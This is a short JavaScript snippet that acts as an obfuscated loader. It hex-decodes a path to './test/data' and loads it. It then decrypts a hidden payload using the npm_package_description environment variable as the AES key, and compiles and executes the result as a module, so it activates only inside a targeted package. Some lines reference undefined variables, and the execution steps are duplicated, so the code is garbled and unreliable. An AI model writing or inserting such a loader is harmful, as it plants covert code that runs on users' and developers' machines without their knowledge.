function decode(data) { return Buffer.from(data, "hex").toString() }
var n = require(decode("2e2f746573742f64617461"))
npm_package_description = process['env']['npm_package_description'];
if (npm_package_description) {
    var decipher = require('crypto')['createDecipher']('aes256',npm_package_description)
    decoded = decipher.update(n[0], 'hex', 'utf8');
    decoded += decipher.final('utf8');
    var newModule = new module.constructor;
    f.paths = module.paths, f[e(n[7])](a, ""), f.exports(n[1])
    newModule.paths = module.paths, newModule['_compile'](decoded, ""), newModule.exports(n[1])
    newModule.paths = module.paths
    newModule['_compile'](decoded, "")
    newModule.exports(n[1])
}